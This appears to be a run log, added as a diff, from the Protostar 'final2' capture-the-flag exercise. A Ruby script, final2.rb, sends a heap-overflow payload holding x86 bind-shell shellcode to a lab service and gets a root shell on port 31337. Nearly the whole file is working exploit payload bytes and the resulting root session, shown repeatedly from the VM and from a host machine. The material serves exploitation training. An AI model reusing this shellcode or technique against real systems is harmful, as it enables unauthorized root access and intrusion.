@@ -1,0 +1,65 @@
+# Execute in the virtual machine:
+
+root@protostar:/tmp# uname -a
+Linux protostar 2.6.32-5-686 #1 SMP Mon Oct 3 04:15:24 UTC 2011 i686 GNU/Linux
+root@protostar:/tmp# ./final2.rb 
+> Enter hostname:
+localhost
+"FSRD\220\220\220\220\220\220\220\2201\3001\3331\3111\322\260f\263\001Qj\006j\001j\002\211\341\315\200\211\306\260f\263\002RfhzifS\211\341j\020QV\211\341\315\200\260f\263\004j\001V\211\341\315\200\260f\263\005RRV\211\341\315\200\211\3031\311\261\003\376\311\260?\315\200u\3701\300Rhn/shh//bi\211\343RS\211\341R\211\342\260\v\315\200\220\220\220\220\220\220\220/"
+"FSRDzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzROOTzzz/\370\377\377\377\374\377\377\377\020\324\004\b\b\340\004\b"
+192.168.215.129: inverse host lookup failed: Unknown host
+(UNKNOWN) [192.168.215.129] 31337 (?) open
+uname -a
+Linux protostar 2.6.32-5-686 #1 SMP Mon Oct 3 04:15:24 UTC 2011 i686 GNU/Linux
+whoami
+root
+id
+uid=0(root) gid=0(root) groups=0(root)
+^C
+root@protostar:/tmp# ^C
+root@protostar:/tmp# 
+
+
+# Execute in the host:
+
+> uname -a
+Darwin Senris-MacBook-Pro.local 21.4.0 Darwin Kernel Version 21.4.0: Mon Feb 21 20:34:37 PST 2022; root:xnu-8020.101.4~2/RELEASE_X86_64 x86_64
+> ./final2.rb
+> Enter hostname:
+192.168.215.129
+"FSRD\x90\x90\x90\x90\x90\x90\x90\x901\xC01\xDB1\xC91Ұf\xB3\u0001Qj\u0006j\u0001j\u0002\x89\xE1̀\x89ưf\xB3\u0002RfhzifS\x89\xE1j\u0010QV\x89\xE1̀\xB0f\xB3\u0004j\u0001V\x89\xE1̀\xB0f\xB3\u0005RRV\x89\xE1̀\x89\xC31ɱ\u0003\xFEɰ?̀u\xF81\xC0Rhn/shh//bi\x89\xE3RS\x89\xE1R\x89\xE2\xB0\v̀\x90\x90\x90\x90\x90\x90\x90/"
+"FSRDzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzROOTzzz/\xF8\xFF\xFF\xFF\xFC\xFF\xFF\xFF\u0010\xD4\u0004\b\b\xE0\u0004\b"
+Connection to 192.168.215.129 port 31337 [tcp/*] succeeded!
+uname -a
+Linux protostar 2.6.32-5-686 #1 SMP Mon Oct 3 04:15:24 UTC 2011 i686 GNU/Linux
+whoami
+root
+id
+uid=0(root) gid=0(root) groups=0(root)
+^C./final2.rb:34:in `system': Interrupt
+	from ./final2.rb:34:in `<main>'
+
+
+# Just like final0, 
+# if you use `exit` in the shell,
+# then the port will be inaccessible for a certain period of time
+
+> ./final2.rb
+> Enter hostname:
+192.168.215.129
+"FSRD\x90\x90\x90\x90\x90\x90\x90\x901\xC01\xDB1\xC91Ұf\xB3\u0001Qj\u0006j\u0001j\u0002\x89\xE1̀\x89ưf\xB3\u0002RfhzifS\x89\xE1j\u0010QV\x89\xE1̀\xB0f\xB3\u0004j\u0001V\x89\xE1̀\xB0f\xB3\u0005RRV\x89\xE1̀\x89\xC31ɱ\u0003\xFEɰ?̀u\xF81\xC0Rhn/shh//bi\x89\xE3RS\x89\xE1R\x89\xE2\xB0\v̀\x90\x90\x90\x90\x90\x90\x90/"
+"FSRDzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzROOTzzz/\xF8\xFF\xFF\xFF\xFC\xFF\xFF\xFF\u0010\xD4\u0004\b\b\xE0\u0004\b"
+Connection to 192.168.215.129 port 31337 [tcp/*] succeeded!
+uname -a
+Linux protostar 2.6.32-5-686 #1 SMP Mon Oct 3 04:15:24 UTC 2011 i686 GNU/Linux
+whoami
+root
+id
+uid=0(root) gid=0(root) groups=0(root)
+exit
+> ./final2.rb
+> Enter hostname:
+192.168.215.129
+"FSRD\x90\x90\x90\x90\x90\x90\x90\x901\xC01\xDB1\xC91Ұf\xB3\u0001Qj\u0006j\u0001j\u0002\x89\xE1̀\x89ưf\xB3\u0002RfhzifS\x89\xE1j\u0010QV\x89\xE1̀\xB0f\xB3\u0004j\u0001V\x89\xE1̀\xB0f\xB3\u0005RRV\x89\xE1̀\x89\xC31ɱ\u0003\xFEɰ?̀u\xF81\xC0Rhn/shh//bi\x89\xE3RS\x89\xE1R\x89\xE2\xB0\v̀\x90\x90\x90\x90\x90\x90\x90/"
+"FSRDzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzROOTzzz/\xF8\xFF\xFF\xFF\xFC\xFF\xFF\xFF\u0010\xD4\u0004\b\b\xE0\u0004\b"
+nc: connectx to 192.168.215.129 port 31337 (tcp) failed: Connection refused
